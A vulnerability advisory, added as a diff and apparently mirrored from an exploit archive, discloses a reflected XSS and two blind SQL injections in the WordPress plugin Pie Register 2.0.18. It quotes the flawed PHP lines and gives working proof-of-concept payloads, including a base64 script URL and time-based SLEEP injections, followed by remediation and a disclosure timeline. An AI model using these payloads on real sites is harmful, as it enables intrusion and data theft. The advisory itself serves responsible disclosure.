@@ -1,0 +1,72 @@
+id: 24417
+date: 10/13/2015
+title: WordPress Pie Register 2.0.18 Cross Site Scripting / SQL Injection Vulnerabilities
+author: David Moore
+cves: CVE-2015-7377, CVE-2015-7682
+
+Description
+================
+An unauthenticated reflected XSS vulnerability in Pie Register 2.0.18 allows malicious script injection via the invitaion_code parameter.  Pie Register is a WordPress plugin with over 10,000 active installs.
+
+Vulnerability
+================
+The vulnerability is due to the unsanitized GET parameter invitaion_code:
+
+From: pie-register/pie-register.php:
+647: $inv_code = base64_decode($_GET['invitaion_code']);
+. . .
+662: <h2><?php _e("Activation Code","piereg");echo " : ".$inv_code; ?></h2>
+
+Proof of concept
+================
+The payload is Base64 encoded.
+
+http://localhost/wordpress/?page=pie-register&show_dash_widget=1&invitaion_code=PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+
+Tested on Firefox 41.0 and Chrome 45.0.2454.85.
+
+Description
+================
+Two blind SQL injection vulnerabilities in Pie Register 2.0.18 allow SQL injection by admins leading to loss of database confidentiality. Pie Register is a WordPress plugin with over 10,000 active installs.
+
+Vulnerabilities
+================
+The vulnerabilities are due to the unsanitized POST parameters invitaion_code_bulk_option and invi_del_id:
+
+Injection 1:
+>From  pie-register/pie-register.php:
+576: $this->delete_invitation_codes($_POST['select_invitaion_code_bulk_option']);
+. . .
+3521: $sql = "DELETE FROM `$codetable` WHERE `id` IN ( ".$ids." )";
+
+Injection 2:
+>From pie-register/pie-register.php:
+1941: if($wpdb->query("DELETE FROM ".$codetable." WHERE id = ".$_POST['invi_del_id']))
+
+Proof of concept
+================
+URL: http://localhost/wordpress/wp-admin/admin.php?page=pie-invitation-codes
+
+Injection 1:
+POST data:
+select_invitaion_code_bulk_option=1)%20OR%20SLEEP(15)%3d0%20LIMIT%201--&invitaion_code_bulk_option=delete&btn_submit_invitaion_code_bulk_option=Apply
+
+Injection 2:
+POST data:
+piereg_invitation_nonce=66e7e6383d&_wp_http_referer=%2Fwordpress%2Fwp-admin%2Fadmin.php%3Fpage%3Dpie-invitation-codes&invi_del_id=1%20OR%20SLEEP(15)%3d0%20LIMIT%201--
+
+Remediation
+================
+Upgrade the plugin to version 2.0.19 or higher.
+
+Timeline
+================
+2015-09-23: Discovered
+2015-09-24: Contacted vendor via website support form
+2015-09-28: Vendor supplied security contact email
+2015-09-28: Requested CVE
+2015-09-30: Report sent to vendor and wordpress.org
+2015-10-02: Vendor releases version 2.0.19 on Github - confirmed fixed
+2015-10-12: Public Disclosure
+
+#  0day.today [2023-03-21]  #
